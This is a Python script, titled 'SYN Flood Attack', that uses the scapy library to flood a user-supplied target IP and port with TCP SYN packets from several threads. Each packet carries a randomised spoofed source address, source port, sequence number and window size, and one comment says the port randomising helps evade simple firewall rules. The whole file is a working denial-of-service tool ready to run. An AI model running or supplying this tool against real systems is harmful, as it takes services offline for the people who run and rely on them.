"""
SYN Flood tool
https://en.wikipedia.org/wiki/SYN_flood
"""
__title__ = "SYN Flood Attack"
__author__ = "s3a6m9"
__version__ = "1.0"


import random
import threading
from scapy.all import IP, TCP, send


def generate_ip(ipv4=False, ipv6=False):
    """
    Generate a random IP address.

    Parameters:
    ipv4 (bool): True if you want to generate ipv4, and vice versa.
    ipv6 (bool): Same as ipv4 but generates ipv6 

    Returns:
    str: the specified IP address type generated

    Resources:
    https://en.wikipedia.org/wiki/Internet_Protocol_version_4
    https://en.wikipedia.org/wiki/IPv6
    https://www.electronics-tutorials.ws/binary/bin_3.html
    """
    if ipv4:
        # between 1 and 254 for better IPs, so it does not start with 0 or 255, etc.
        return ".".join([str(random.randint(1, 254)) for i in range(4)]) 
    elif ipv6:
        # Similar to IPv4, highest possible value - 1 and lowest possible value + 1.
        # hex sliced due to string starting with '0x'
        return ":".join([str(hex(random.randint(1, 65_534))[2:]) for i in range(8)]) 


def generate_tcp_sport():
    # can be between 1> and <65,535 but if under
    # 2000, ports may be already in use.
    return random.randint(2_000, 30_000)

def generate_tcp_window():
    # Larger number = bigger packet size? + bigger server resource prepartion?
    # can be between 1 and 65,535
    return random.randint(3_000, 15_000)

def generate_tcp_seq():
    # Larger number = larger packet size?
    # can be between 1 and 65,535
    return random.randint(1000, 10_000)


def construct_SYN_packet(dest_ip: str, dest_port: int):
    """
    Constructs the prerequisites to a SYN packet (IP and TCP packets)
    so that the packets can be remodified with different values during
    the attack.

    Parameters:
    dest_ip (str): Destination IP
    dest_port (str): Destination port

    Returns:
    IP packet (class): Pre-configured IP packet without source IP

    TCP packet (class) Pre-configured TCP packet without the source port, 
    sequence number, and window size, 
    """
    ip_packet = IP(dst=dest_ip)

    # https://en.wikipedia.org/wiki/Transmission_Control_Protocol
    tcp_packet = TCP(dport=dest_port, flags="S")
    # flags parameters below, 'S' = SYN
    # https://stackoverflow.com/questions/20429674/get-tcp-flags-with-scapy

    return ip_packet, tcp_packet


def SYN_Attack(IP_packet, TCP_packet, iterations):
    for i in range(iterations):
        IP_packet.src = generate_ip(ipv4=True)
        TCP_packet.sport = generate_tcp_sport()  # Does not matter much, except for evading simple firewall rules
        TCP_packet.seq = generate_tcp_seq()
        TCP_packet.window = generate_tcp_window()
        send(IP_packet/TCP_packet, verbose=0)
    print(f"Sent {iterations} SYN packets.")


def main():
    target_ip = input("\nTarget IP: ")
    target_port = int(input("Target Port: "))
    thread_count = int(input("Thread count: "))
    packet_count = int(input("How many packets per thread? "))

    ip_packet, tcp_packet = construct_SYN_packet(target_ip, target_port)

    threads = []
    for tc in range(thread_count):
        threads.append(threading.Thread(target=SYN_Attack, args=(ip_packet, tcp_packet, packet_count)))
    
    print("\n\t\t[+] Starting [+]\n\n")
    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()

    print("\n\t\t[+] Finished [+]")

if __name__ == "__main__":
    main()
